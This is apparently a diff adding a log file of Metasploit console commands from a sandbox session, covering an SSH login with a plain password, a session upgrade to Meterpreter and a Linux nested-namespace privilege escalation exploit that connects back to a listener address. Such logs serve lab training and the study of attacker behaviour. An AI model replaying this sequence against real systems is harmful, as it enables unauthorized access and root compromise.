@@ -1,0 +1,33 @@
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:05:25.179288Z", "cmd_type": "msf-command", "cmd": "search 18955"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:06:06.524868Z", "cmd_type": "msf-command", "cmd": "use exploit/linux/local/nested_namespace_idmap_limit_priv_esc "}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:06:09.078523Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:05.166287Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/ssh_login"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:07.238260Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:23.193673Z", "cmd_type": "msf-command", "cmd": "set rHOSTS 172.18.1.5 "}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:26.672811Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:37.214836Z", "cmd_type": "msf-command", "cmd": "set password starwars"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:45.945977Z", "cmd_type": "msf-command", "cmd": "set username alice"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:07:48.243898Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:08:17.207886Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:08:49.605823Z", "cmd_type": "msf-command", "cmd": "sessions -u 1"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:08:54.166355Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:08:59.316756Z", "cmd_type": "msf-command", "cmd": "use exploit/linux/local/nested_namespace_idmap_limit_priv_esc "}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:09:01.860579Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:09:07.399742Z", "cmd_type": "msf-command", "cmd": "set session 2"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:09:35.123036Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:09:45.164395Z", "cmd_type": "msf-command", "cmd": "connect 2"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:10:29.784851Z", "cmd_type": "msf-command", "cmd": "sessions"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:10:53.829292Z", "cmd_type": "msf-command", "cmd": "sessions -i 2"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:11:02.649857Z", "cmd_type": "msf-command", "cmd": "use auxiliary/scanner/ssh/ssh_login"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:11:17.919533Z", "cmd_type": "msf-command", "cmd": "sessions -u 1"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:11:46.373012Z", "cmd_type": "msf-command", "cmd": "sessions -i 3"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:11:53.489492Z", "cmd_type": "msf-command", "cmd": "use exploit/linux/local/nested_namespace_idmap_limit_priv_esc "}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:11:55.680201Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:12:15.619005Z", "cmd_type": "msf-command", "cmd": "set session 1"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:13:02.654491Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.0.135.83"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:13:08.343546Z", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:13:28.161132Z", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:13:44.662826Z", "cmd_type": "msf-command", "cmd": "sessions "}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:13:57.241565Z", "cmd_type": "msf-command", "cmd": "sessions -u 1"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:14:05.840450Z", "cmd_type": "msf-command", "cmd": "set session 4"}
+{"sandbox_id": "397", "timestamp_str": "2019-08-14T16:14:22.747289Z", "cmd_type": "msf-command", "cmd": "exploit"}
